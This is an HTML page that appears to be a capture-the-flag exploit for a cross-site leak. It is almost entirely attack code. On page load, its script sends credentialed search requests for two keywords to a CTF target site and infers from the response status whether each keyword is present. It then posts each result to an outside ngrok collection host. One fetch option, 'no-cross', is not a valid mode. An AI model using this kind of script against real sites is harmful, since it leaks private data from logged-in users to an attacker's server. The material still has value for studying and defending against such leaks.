<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Example</title>
    <script>
        async function logResult(keyword, status) {
            try {
                const response = await fetch('https://e206-87-4-142-72.ngrok-free.app/log', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ keyword, status })
                });
                if (!response.ok) {
                    console.error('Failed to log result:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Error logging result:', error);
            }
        }

        async function checkKeywords() {
            const keywords = ['Thomas', 'Anderson'];

            for (const keyword of keywords) {
                try {
                    const response = await fetch(`https://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`, {
                        method: 'GET',
                        credentials: 'include',
                        mode: 'no-cross'
                    });

                    if (response.status === 200) {
                        console.log(`Keyword found: ${keyword}`);
                        await logResult(keyword, 'found');
                    } else if (response.status === 404) {
                        console.log(`Keyword not found: ${keyword}`);
                        await logResult(keyword, 'not found');
                    }
                } catch (error) {
                    console.error('Error during keyword check:', error);
                }
            }
        }

        // Esegui la funzione checkKeywords quando la pagina Ã¨ completamente caricata
        window.addEventListener('DOMContentLoaded', () => {
            checkKeywords();
        });
    </script>
</head>
<body>
    <h1>XS-Leak Keyword Checker</h1>
</body>
</html>
